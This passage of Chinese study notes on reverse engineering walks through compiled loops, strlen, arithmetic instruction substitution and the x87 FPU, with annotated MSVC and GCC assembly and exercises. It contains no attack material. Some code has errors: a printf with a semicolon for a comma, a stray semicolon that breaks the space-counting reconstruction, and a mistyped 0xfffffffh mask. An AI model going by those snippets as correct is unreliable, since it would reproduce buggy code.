class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>区别在于gcc是拿ebx作为i的专有寄存器，其他与msvs类似</p></li></ul><hr /><h3 id="内存块复制"><a class="markdownIt-Anchor" href="#内存块复制"></a> 内存块复制</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">void</span> <span class="token function">my_memcpy</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span> dst<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span> src<span class="token punctuation">,</span> <span class="token class-name">size_t</span> cnt<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>         <span class="token class-name">size_t</span> i<span class="token punctuation">;</span>         <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>cnt<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>                  dst<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>src<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr /><p><code>gcc -Os</code></p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">; RDI &#x3D; 目标地址;dst; RSI &#x3D; 源地址;src; RDX &#x3D; 块大小;cnt; 在 0 的位置初始化计数器（i）xor     eax, eax    .L2:    ; 如果所有字节已复制，则退出：cmp     rax, rdx   ; 对寄存器rax和rdx的值进行比较。   je      .L5    ; 如果这两个值相等（即已经拷贝了规定的字节数），就跳转到.L5，即返回（ret）。; 在 RSI+i 处加载字节：mov     cl, BYTE PTR [rsi+rax]   ; 将地址为（rsi+rax）的一个字节值加载到cl寄存器中。; 在 RDI+i 处存储字节：mov     BYTE PTR [rdi+rax], cl   ; 将cl寄存器的值存储到地址为（rdi+rax）的内存中。inc     rax   ; i++，将rax寄存器的值增加1，以便下一次复制下一个字节。jmp     .L2   ; 无条件跳转到.L2，进行下一轮的比较和字节拷贝。.L5:ret    ; 函数返回，结束拷贝操作。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h3><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">    MOV [counter], 2 ; initialization    JMP label_checklabel_increment:    ADD [counter], 1 ; incrementlabel_check:    CMP [counter], 10    JGE exit    ; loop body    ; do something here    ; use counter variable in local stack    JMP label_incrementexit:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通常情况下，程序应当首先判断循环条件是否满足，然后再执行循环体。但是在编译器确定第一次迭代肯定会发生的情况下，它可能会调换循环体和判断语句的顺序。下面这个程序就是个典型的例子。</p><p>指令清单14.19　x86</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">    MOV REG, 2 ; initializationbody:    ; loop body    ; do something here    ; use counter in REG, but do not modify it!    INC REG ; increment    CMP REG, 10    JL body<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>编译器不会使用LOOP指令。由LOOP控制的循环控制语句比较少见。如果某段代码带有LOOP指令，那么您应当认为这是手写出来的汇编程序。</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">    ; count from 10 to 1    MOV ECX, 10body:    ; loop body    ; do something here    ; use counter in ECX, but do not modify it!    LOOP body<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>ECX</code>作为count的专用寄存器</p><h3 id="problem-2"><a class="markdownIt-Anchor" href="#problem-2"></a> Problem</h3><ol><li></li></ol><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">;</span>i<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">;</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ol start="4"><li></li></ol><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">100</span><span class="token punctuation">;</span>i<span class="token operator">+=</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="chap15-c语言字符串的函数"><a class="markdownIt-Anchor" href="#chap15-c语言字符串的函数"></a> Chap15 C语言字符串的函数</h2><h3 id="strlen"><a class="markdownIt-Anchor" href="#strlen"></a> strlen()</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">my_strlen</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span> str<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>eos<span class="token operator">=</span>str<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">*</span>eos<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">(</span>eos<span class="token operator">-</span>str<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">my_strlen</span><span class="token punctuation">(</span><span class="token string">"hello!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr /><p><code>Non-optimizing MSVS</code></p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">_eos$ &#x3D; -4                            ; 定义局部变量eos的栈偏移量为-4_str$ &#x3D; 8                             ; 定义参数str的栈偏移量为8_strlen PROC    push    ebp                       ; 保存基址指针    mov     ebp, esp                  ; 设置新的基址指针    push    ecx                       ; 保存ecx寄存器的值    mov     eax, DWORD PTR _str$[ebp] ; 将传入的字符串指针存储到eax中    mov     DWORD PTR _eos$[ebp], eax ; 将eax的值（即字符串指针）保存到局部变量eos 中$LN2@strlen_:    mov     ecx, DWORD PTR _eos$[ebp] ; 将eos的值加载到ecx中    ; 从ecx指向的地址处取8位字节，并将其作为32位值（带符号扩展）加载到edx中    movsx   edx, BYTE PTR [ecx];edx&#x3D;*eos    mov     eax, DWORD PTR _eos$[ebp] ; 将eos的值加载到eax中    add     eax, 1                    ; 将eax自增1，指向下一个字符    mov     DWORD PTR _eos$[ebp], eax ; 将更新后的eax值保存回eos中    test    edx, edx                  ; 测试edx寄存器（即当前字符是否为0）    je      SHORT $LN1@strlen_        ; 如果edx为0，跳转到$LN1@strlen_，结束循环    jmp     SHORT $LN2@strlen_        ; 否则，继续循环$LN1@strlen_:    ; 计算两个指针之间的差值    mov    eax, DWORD PTR _eos$[ebp]  ; 将eos的值加载到eax中    sub    eax, DWORD PTR _str$[ebp]  ; 用eos减去原始字符串指针    sub    eax, 1                     ; 减去1，得到字符串长度（不包括结尾的空字符）    mov    esp, ebp                   ; 恢复栈指针    pop    ebp                        ; 恢复基址指针    ret    0                          ; 返回结果（eax中保存着字符串长度）_strlen ENDP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p><code>MOVSX</code>,即<code>MOV with Sign Extend</code>,从内存中读取8位数据，并存储到32位寄存器里</p><p>本例中，MOVSX将用原始数据的8位数据填充EDX寄存器的低8位；<mark>如果原始数据是负数，该指令将使用1填充第8到第31位（高24位），否则使用0填充高24位</mark>。</p><p>这是为了保证有符号型数据在类型转换后的数值保持不变。</p><p>举了个例子</p><p>假如char型数据的原始值是−2（0xFE），直接把整个字节复制到int型数据的最低8位上时，int型数据的值就变成0x000000FE，以有符号型数据的角度看它被转换为254了，而没有保持原始值−2。−2对应的int型数据是0xFFFFFFFE。所以，在把原始数据复制到目标变量之后，还要使用符号标志位填充剩余的数据，而这就是MOVSX的功能。</p></li></ul><hr /><p><code>Non-optimizing GCC</code></p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">public strlen               ; 公共标志，使得其他模块可以调用该函数strlen           proc near                   ; 声明一个near过程，命名为strleneos              &#x3D; dword ptr -4               ; 定义局部变量eos的栈偏移量为-4arg_0            &#x3D; dword ptr  8               ; 定义参数arg_0（字符串指针）的栈偏移量为8                 push    ebp                  ; 保存基址指针                 mov     ebp, esp             ; 设置新的基址指针                 sub     esp, 10h             ; 为局部变量分配16字节的栈空间                 mov     eax, [ebp+arg_0]     ; 将传入的字符串指针加载到eax中                 mov     [ebp+eos], eax       ; 将eax的值（即字符串指针）保存到局部变量eos中loc_80483F0:                 mov     eax, [ebp+eos]       ; 将eos的值加载到eax中                 movzx   eax, byte ptr [eax]  ; 从eax指向的地址处加载一个字节，并零扩展为32位                 test    al, al               ; 测试al寄存器的值（即当前字符是否为0）                 setnz   al                   ; 如果al不为零，al &#x3D; 1；否则，al &#x3D; 0                 add     [ebp+eos], 1         ; 将eos自增1，指向下一个字符                 test    al, al               ; 测试al寄存器的值（即当前字符是否为零）                 jnz     short loc_80483F0    ; 如果al不为零，跳转到loc_80483F0，继续循环                 ; 循环结束（当前字符为0），计算字符串的长度                 mov     edx, [ebp+eos]       ; 将eos的值加载到edx中                 mov     eax, [ebp+arg_0]     ; 将传入的字符串指针加载到eax中                 mov     ecx, edx             ; 将edx的值加载到ecx中                 sub     ecx, eax             ; ecx &#x3D; edx - eax，计算eos与字符串起始地址的差值                 mov     eax, ecx             ; 将ecx的值加载到eax中                 sub     eax, 1               ; eax减去1，得到字符串的实际长度（不包括结尾的空字符）                 leave                        ; 恢复栈指针和基址指针                 retn                         ; 返回结果（eax中保存着字符串长度）strlen           endp                        ; 过程结束<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>这里<code>sub esp,10h</code>,<code>eos</code>只需要4个字节，但是为了满足对齐要求分配了额外的12个字节</p></li><li><p><code>MOVZX</code>是<code>MOV with Zero-Extent</code>的缩写,将8位或16位数据转换为32位数据的时候，它直接复制原始数据到目标寄存器的相应低位，并且使用0填充剩余的高位。</p><p>==相当于一步完成了“xor eax, eax”和“mov al，[源8/16位数据]”2条指令</p></li><li><p><code>SETNZ</code>指令:如果AL的值不是0，则“test al, al”指令会设置标志寄存器ZF=0；而SETNZ（Not Zero）指令会在ZF＝0的时候，设置AL＝1。用白话解说，就是：<mark>如果AL不等于0，则跳到loc_80483F0处</mark>。编译器转译出来的代码中，有些代码确实没有实际意义</p></li></ul><hr /><p><code>Optimizing MSVS</code></p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">_str$ &#x3D; 8                                     ; size &#x3D; 4_strlen PROC        mov     edx, DWORD PTR _str$[esp-4]   ;用EDX作字符串指针        mov     eax, edx                      ;  复制到 EAX$LL2@strlen:        mov     cl, BYTE PTR [eax]            ; CL &#x3D; *EAX        inc     eax                           ; EAX++        test    cl, cl                        ; CL&#x3D;&#x3D;0?        jne     SHORT $LL2@strlen             ; no, continue loop        sub     eax, edx                      ; 计算指针的变化量        dec     eax                           ; decrement EAX        ret     0_strlen ENDP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr /><p><code>Optimizing GCC</code> <code>-O3</code></p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">                public strlenstrlen          proc neararg_0           &#x3D; dword ptr  8                push    ebp                mov     ebp, esp                mov     ecx, [ebp+arg_0];ecx&#x3D;arg_0;                mov     eax, ecx;eax&#x3D;arg_0loc_8048418:                movzx   edx, byte ptr [eax];edx&#x3D;*eop                add     eax, 1;eop++                test    dl, dl;if dl &#x3D;&#x3D;0?                jnz     short loc_8048418;dl !&#x3D;0,loop                not     ecx                add     eax, ecx                pop     ebp                retnstrlen          endp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p><code>movzx</code>替换为<code>mov dl byte ptr[eax]</code>也可，使用<code>movzx</code>或许是为了保证寄存器的高地址位不含有噪音数据</p></li><li><p><mark><code>NOT</code>，NOT指令对操作数的所有bit都进行非运算，等价于<code>XOR ECX,0xfffffffh</code>,<code>not ecx</code>的结果与某数相加,相当于某数减去<code>ECX</code>然后再减<code>1</code></mark></p><p>从而得到正确的字符串长度</p><p><code>not ecx</code>相当于<code>ecx=(-ecx)-1</code>，由位运算可以推导</p></li></ul><hr /><p>Problems:</p><ol><li></li></ol><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">_s$   &#x3D;  8_f    PROC           mov  edx, DWORD PTR _s$[esp-4];edx&#x3D;_s           mov  cl, BYTE PTR [edx];cl&#x3D;*_s&#x3D;8           xor  eax, eax           test cl, cl           je   SHORT $LN2@f;if cl&#x3D;&#x3D;0,exit           npad 4    ; align next label$LL4@f:           cmp  cl, 32;           jne  SHORT $LN3@f;if cl!&#x3D;32,jmp LN3           inc  eax;eax++$LN3@f:           mov  cl, BYTE PTR [edx+1];cl&#x3D;*(_s+1)           inc  edx;eax++           test cl, cl           jne  SHORT $LL4@f;if cl!&#x3D;0;jmp LL4$LN2@f:           ret  0_f         ENDP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>_s<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> count<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">*</span>_s<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">*</span>_s<span class="token operator">==</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//' '相当于统计字符串的空格数</span>        <span class="token punctuation">&#123;</span>            count<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> count<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li></li></ol><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">.LFB24:        push      ebx                    ; 保存 ebx 寄存器的值        mov       ecx, DWORD PTR [esp+8] ; 将参数(假设是字符串指针)传递给 ecx        xor       eax, eax               ; 将 eax 寄存器清零 (计数器)        movzx     edx, BYTE PTR [ecx]    ; 将字符串的第一个字符加载到 edx        test      dl, dl                 ; 测试该字符是否为 null (字符串结尾)        je        .L2                    ; 如果是 null, 跳转到 .L2 结束.L3:        cmp       dl, 32                 ; 比较该字符与空格 (ASCII 32)        lea       ebx, [eax+1]           ; 计算当前计数器值加1的地址        cmove     eax, ebx               ; 如果字符是空格，eax &#x3D; ebx (即eax加1)        add       ecx, 1                 ; 将 ecx 指针前移一个字符        movzx     edx, BYTE PTR [ecx]    ; 将下一个字符加载到 edx        test      dl, dl                 ; 测试该字符是否为 null        jne       .L3                    ; 如果不是 null, 跳转到 .L3 继续处理.L2:        pop       ebx                    ; 恢复 ebx 寄存器的值        ret                              ; 返回<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>cmove</code> 指令是 x86 汇编中的条件移动指令之一，它的全名是<code>conditional move if equal</code>。这意味着当满足给定条件时，从源操作数移动到目标操作数，而如果条件不成立，则不进行移动.如果比较结果是相等（即当前字符是空格）<code>eax=ebx=eax+1</code></li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>str<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> count<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">*</span>str<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> temp<span class="token operator">=</span>count<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">*</span>str<span class="token operator">==</span><span class="token number">32</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            count<span class="token operator">=</span>temp<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> count<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>进一步简化代码就是计数所有空格字符</p><h2 id="chap16-数学计算指令的替换"><a class="markdownIt-Anchor" href="#chap16-数学计算指令的替换"></a> Chap16 数学计算指令的替换</h2><p><code>出于性能优化的考虑，编译器可能会将1条数学运算指令替换为其他的1条、甚至是一组等效指令。</code>例如<code>LEA</code>指令通常替代其他简单计算指令，<code>ADD</code>与<code>SUB</code>同样可以相互替换</p><h3 id="乘法"><a class="markdownIt-Anchor" href="#乘法"></a> 乘法</h3><h4 id="替换为加法运算"><a class="markdownIt-Anchor" href="#替换为加法运算"></a> 替换为加法运算</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> a<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>         <span class="token keyword">return</span> a<span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>使用MSVC 2010（启用/Ox）进行编译，编译器会把“乘以8”的运算指令拆解为3条加法指令。</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">mov     eax, DWORD PTR _a$[esp-4]add     eax, eaxadd     eax, eaxadd     eax, eaxret     0 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="替换为移位运算"><a class="markdownIt-Anchor" href="#替换为移位运算"></a> 替换为移位运算</h4><p>编译器通常会把“乘以2”“除以2”的运算指令处理为位移运算指令</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> a<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> a<span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">_a$ &#x3D; 8          ; size &#x3D; 4_f       PROC         push    ebp         mov     ebp, esp         mov     eax, DWORD PTR _a$[ebp]         shl     eax, 2;shift left         pop     ebp         ret     0_f       ENDP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="替换为移位加减法的混合运算"><a class="markdownIt-Anchor" href="#替换为移位加减法的混合运算"></a> 替换为移位,加减法的混合运算</h4><p>即使乘数是7或17，乘法运算仍然可以用非乘法运算指令配合位移指令实现。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span><span class="token keyword">int</span> <span class="token function">f1</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>         <span class="token keyword">return</span> a<span class="token operator">*</span><span class="token number">7</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">f2</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>         <span class="token keyword">return</span> a<span class="token operator">*</span><span class="token number">28</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">f3</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>         <span class="token keyword">return</span> a<span class="token operator">*</span><span class="token number">17</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">; a*7_a$ &#x3D; 8_f1      PROC         mov     ecx, DWORD PTR _a$[esp-4]; ECX&#x3D;a         lea     eax, DWORD PTR [ecx*8]; EAX&#x3D;ECX*8         sub     eax, ecx; EAX&#x3D;EAX-ECX&#x3D;ECX*8-ECX&#x3D;ECX*7&#x3D;a*7         ret     0 _f1     ENDP; a*28_a$ &#x3D; 8_f2     PROC         mov     ecx, DWORD PTR _a$[esp-4]; ECX&#x3D;a         lea     eax, DWORD PTR [ecx*8]; EAX&#x3D;ECX*8         sub     eax, ecx; EAX&#x3D;EAX-ECX&#x3D;ECX*8-ECX&#x3D;ECX*7&#x3D;a*7         shl     eax, 2; EAX&#x3D;EAX&lt;&lt;2&#x3D;(a*7)*4&#x3D;a*28         ret     0 _f2     ENDP; a*17_a$ &#x3D; 8_f3     PROC         mov     eax, DWORD PTR _a$[esp-4]; EAX&#x3D;a         shl     eax, 4; EAX&#x3D;EAX&lt;&lt;4&#x3D;EAX*16&#x3D;a*16         add     eax, DWORD PTR _a$[esp-4]; EAX&#x3D;EAX+a&#x3D;a*16+a&#x3D;a*17         ret     0_f3     ENDP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="除法运算"><a class="markdownIt-Anchor" href="#除法运算"></a> 除法运算</h3><h4 id="替换为位移运算"><a class="markdownIt-Anchor" href="#替换为位移运算"></a> 替换为位移运算</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> a<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>       <span class="token keyword">return</span> a<span class="token operator">/</span><span class="token number">4</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><code>shr eax,2</code></p><h3 id="problem-3"><a class="markdownIt-Anchor" href="#problem-3"></a> Problem</h3><ol><li></li></ol><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">_a$ &#x3D; 8_f      PROC        mov     ecx, DWORD PTR _a$[esp-4];ecx&#x3D;a        lea     eax, DWORD PTR [ecx*8];eax&#x3D;a*8        sub     eax, ecx;eax&#x3D;eax-a&#x3D;7a        ret     0_f      ENDP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="chap17-fpu"><a class="markdownIt-Anchor" href="#chap17-fpu"></a> Chap17 FPU</h2><ul><li><p><code>FPU是专门处理浮点数的运算单元，是CPU的一个组件。</code></p></li><li><p><code>IEEE 754 </code>标准规定了计算机程序设计环境中的二进制和十进制的浮点数的交换、算术格式以及方法。符合这种标准的浮点数由符号位、尾数（又称为有效数字、小数位）和指数位构成。</p></li><li><p>在80486处理器问世之前，FPU（与CPU位于不同的芯片）叫作协作（辅助）处理器。而且那个时候的FPU还不属于主板的标准配置；如果想要在主板上安装FPU，人们还得单独购买它。</p><p>80486 DX之后的CPU处理器集成了FPU的功能。</p><p>若没有FWAIT指令和opcode以D8～DF开头的所谓的“ESC”字符指令（opcode以D8～DF开头），恐怕很少有人还会想起FPU属于独立运算单元的这段历史。FWAIT指令的作用是让CPU等待FPU运算结束，而ESC字符指令都在FPU上执行。</p><p>FPU自带一个由<code>8个80位寄存器构成的循环栈</code>。这些80位寄存器用以存储IEEE 754格式的浮点数据，通常叫作<code>ST(0)～ST(7)寄存器</code>。IDA和OllyDbg都把ST(0)显示为ST。也有不少教科书把ST(0)叫作“栈顶/Stack Top”寄存器。</p></li></ul><hr /><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">double</span> <span class="token function">f</span> <span class="token punctuation">(</span><span class="token keyword">double</span> a<span class="token punctuation">,</span> <span class="token keyword">double</span> b<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>          <span class="token keyword">return</span> a<span class="token operator">/</span><span class="token number">3.14</span> <span class="token operator">+</span> b<span class="token operator">*</span><span class="token number">4.1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token function">printf</span> <span class="token punctuation">(</span><span class="token string">"%f\n"</span><span class="token punctuation">,</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token number">1.2</span><span class="token punctuation">,</span> <span class="token number">3.4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">CONST    SEGMENT__real@4010666666666666 DQ 04010666666666666r ; 4.1    ; 定义常量4.1，存储在段&#96;CONST&#96;中CONST    ENDSCONST    SEGMENT__real@40091eb851eb851f DQ 040091eb851eb851fr ; 3.14   ; 定义常量3.14，存储在段&#96;CONST&#96;中CONST    ENDS_TEXT    SEGMENT_a$ &#x3D; 8             ; 变量&#96;_a&#96;的偏移量，相对于基指针(&#96;ebp&#96;)的8字节位置_b$ &#x3D; 16            ; 变量&#96;_b&#96;的偏移量，相对于基指针(&#96;ebp&#96;)的16字节位置_f PROC                ; &#96;_f&#96; 是一个过程（函数）   push    ebp         ; 保存调用者的栈帧基指针，把当前&#96;ebp&#96;值推入栈   mov     ebp, esp    ; 